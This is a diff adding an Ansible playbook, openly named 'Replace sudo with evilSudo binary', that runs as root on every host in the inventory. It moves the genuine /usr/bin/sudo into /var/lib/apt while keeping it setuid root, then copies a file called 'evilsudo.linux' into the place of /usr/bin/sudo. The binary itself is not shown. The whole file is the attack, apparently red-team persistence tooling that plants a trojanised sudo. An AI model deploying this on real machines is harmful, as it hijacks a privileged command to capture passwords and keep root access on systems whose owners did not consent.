@@ -1,0 +1,30 @@
+---
+- name: Replace sudo with evilSudo binary
+  hosts: all
+  become: true
+  vars:
+    source_file: "evilsudo.linux"
+    dest_file: "/usr/bin/sudo"
+
+  tasks:
+    - name: Move /usr/bin/sudo to /var/lib/apt/sudo
+      command: mv /usr/bin/sudo /var/lib/apt/sudo
+      args:
+        creates: /var/lib/apt/sudo
+
+    - name: Set ownership of /var/lib/apt/sudo to root:root
+      file:
+        path: /var/lib/apt/sudo
+        owner: root
+        group: root
+
+    - name: Set permissions of /var/lib/apt/sudo to 4755 (setuid root)
+      file:
+        path: /var/lib/apt/sudo
+        mode: '4755'
+
+    - name: Copy file from playbook directory to /usr/bin/
+      copy:
+        src: "{{ source_file }}"
+        dest: "{{ dest_file }}"
+        mode: '0755'
